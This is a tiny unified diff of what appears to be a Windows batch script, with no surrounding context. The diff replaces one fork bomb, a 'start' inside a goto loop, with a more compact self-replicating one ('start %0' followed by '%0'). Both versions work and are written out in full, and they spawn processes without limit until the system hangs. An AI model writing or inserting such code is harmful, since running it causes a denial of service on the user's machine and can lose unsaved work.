@@ -1,4 +1,2 @@
-@echo off
-:crash
-start
-goto crash
+start %0
+%0
